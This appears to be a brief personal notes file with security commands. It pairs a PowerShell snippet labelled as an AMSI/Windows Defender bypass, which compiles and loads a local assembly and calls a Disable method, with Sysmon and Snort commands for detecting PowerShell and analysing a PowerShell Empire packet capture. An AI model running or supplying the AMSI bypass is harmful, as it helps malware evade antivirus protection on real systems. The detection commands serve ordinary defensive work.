
#Bypass Defender AV AMSI.dll

Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
[BP.AMS]::Disable()


#detect powershell using sysmon and wazuh

Sysmon64.exe -accepteula -i sysconfig.xml

Snort command line:

analyze pcap with snort
snort -c /usr/local/etc/snort/snort.lua -r /home/sysadmin/pcap/http_powershell_empire.pcap -Acmg -k none -q # check packets processing by snort.

![image](https://user-images.githubusercontent.com/92370823/148434675-b392d6db-05fa-4cc0-b40e-92c5397a89c0.png)
